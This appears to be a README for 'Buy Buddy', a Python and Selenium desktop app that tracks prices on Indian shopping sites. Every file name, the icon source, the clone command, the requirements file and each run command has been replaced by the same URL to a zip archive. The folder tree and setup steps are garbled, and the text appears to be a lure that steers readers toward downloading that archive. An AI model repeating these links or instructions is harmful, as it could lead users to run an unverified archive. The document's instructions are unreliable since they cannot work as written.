
<h1 align="center">
  <img src="https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip" alt="Buy Buddy Icon" width="40" height="40"/>
  <span style="vertical-align: middle;">Buy Buddy</span>
</h1>

A cross-platform desktop application built using **Python**, **CustomTkinter**, and **Selenium** that scrapes product data from major Indian e-commerce platforms and notifies users when prices drop below their set budgets.

---

## ✨ Features

- 🔍 **Search products** from:
  - Flipkart
  - Croma
  - Vijay Sales
  - Reliance Digital
- 📊 **Track & compare prices**
- 🔔 **Set a budget** and get **email alerts** on price drops
- ♻️ **Retry failed checks** due to timeout or network issues
- ⚡ **Fast multi-processing** scraping
- 🖥️ Built with **CustomTkinter** for a modern UI
- 📦 Converted to `.exe` using **PyInstaller**

---

## 📁 Folder Structure

```
E_Commerce_Scraper/
│
├── scripts/                # Platform-specific scrapers
│   ├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
│   ├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
│   ├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
│   ├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
│   └── ...
│
├── Images/                 # Icons and UI images
├── Fonts/                  # Custom fonts (JetBrains Mono, etc.)
├── data/
│   └── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip   # Product save file (created on first run)
│
├── CSV_Dataset/            # Scraped CSV files (ignored in git)
├── Saved CSVs/             # Combined CSV files of product (ignored in git)
│
├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip                 # Entry point for the application
├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip             # Wishlist price-checker & email notifier
├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip         # Retry logic for failed product checks
├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip               # PyInstaller spec file
├── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
└── https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
```

---

## 🚀 Getting Started

### 1. Clone the Repository
```bash
git clone https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
cd E_Commerce_Scraper
```

### 2. Install Dependencies
```bash
pip install -r https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
```

Make sure you have:
- **Google Chrome**
- Compatible **ChromeDriver** added to your `PATH`
- Internet connection for scraping and email alerts

### 3. Run the App
```bash
python https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
```

---

## 🔔 Run Notifier Script

To automatically check prices and send an email if a product is under your budget:
```bash
python https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
```

Configure email sender, recipient, and credentials in `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` if needed.

---

## ♻️ Retry Failed Products

If any product failed to load in `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` (due to timeout or scraping issues), you can rerun them with:
```bash
python https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
```

This script reads the failed items from the log and attempts again using the appropriate scrapers.

---

## 🕒 Scheduled Automation (Windows Task Scheduler / Cron)

To automate price tracking:

1. **Schedule `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip`**
   - Set it to run daily or multiple times a day.
   - Recommended method: Use Task Scheduler (Windows) or cron (Linux/macOS).

2. **Schedule `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` shortly after**
   - Ensure this runs a few minutes after `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` finishes.
   - It will attempt to scrape any items that failed in the notifier script.

Example (Windows Task Scheduler):

- `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` at 10:00 AM
- `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` at 10:20 AM

> 💡 You can schedule the `.exe` versions of both scripts as well after converting using PyInstaller.

---

## 🛠️ Build as `.exe` (Windows only)

To convert into a standalone app:
```bash
pyinstaller --onefile --noconsole https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip ^
  --add-data "Images;Images" --add-data "Fonts;Fonts" --add-data "data;data" https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip
```

For proper `selenium-stealth` support, include required JS files manually in the `.spec` file under `datas`.

---

## ⚠️ Notes

- Results are not the accurate everytime, sometimes products didn't load properly
- Notifier script is not accurate, sometimes it fails to fetch the price, make sure to execute retry_failed after that.
- `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` is created if it doesn’t exist on first run
- Avoid bundling `https://github.com/codenoob7/Buy_Buddy/raw/refs/heads/main/scripts/Buddy-Buy-v3.0.zip` as a read-only asset

---

## 📌 TODO

- [ ] Add push/email config through GUI
- [ ] Logging of all scraping actions
- [ ] Product availability alerts
- [ ] Search on result screen
- [ ] Notifier Screen
- [ ] Wishlist Screen
- [ ] Search Method Options
- [ ] Optional cloud backup

---

## 📄 License

MIT License. See [LICENSE](LICENSE) for details.
